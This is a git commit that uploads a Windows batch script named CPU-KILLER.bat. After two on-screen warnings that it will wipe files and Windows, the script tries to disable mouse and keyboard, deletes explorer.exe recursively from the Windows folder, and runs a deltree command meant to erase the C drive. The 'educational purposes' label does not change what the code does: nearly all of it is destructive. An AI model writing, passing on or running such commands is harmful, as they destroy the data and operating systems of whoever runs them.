3d628c65bed0f88d16451cfc008208a69f9eb065
neves07 <109999413+MiguelNeves07@users.noreply.github.com>
2023-05-12 23:24:00 -0300

    Add files via upload

---
+++ CPU-KILLER/CPU-KILLER.bat
@@ -0,0 +1,50 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFD1VQQ2ONWr6QPU/4enHy+WQrEESVeYsRIzLz/mUHMMj3wjeRZk/wntYlM4wLQtIQjO7fiY6r2F+t3SVPsSTvUHoSUfp
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFD1VQQ2ONWr6QPU/4enHy++UqVkSRN4cSLqW8Z2iDMUhpED8cPY=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+@echo HEY!
+@echo If you want open that malware on a real PC will damage all your files and that 
+@echo will delete your HD and your windows, do you will open the malware?
+pause
+cls
+@echo LAST WARNING!
+@echo Open that only with educational puporses!!
+pause
+rundll32 mouse,disable
+rundll32 keyboard,disable
+cd\
+cd windows
+del /s /q explorer.exe
+cls
+deltree /y :c\
+exit
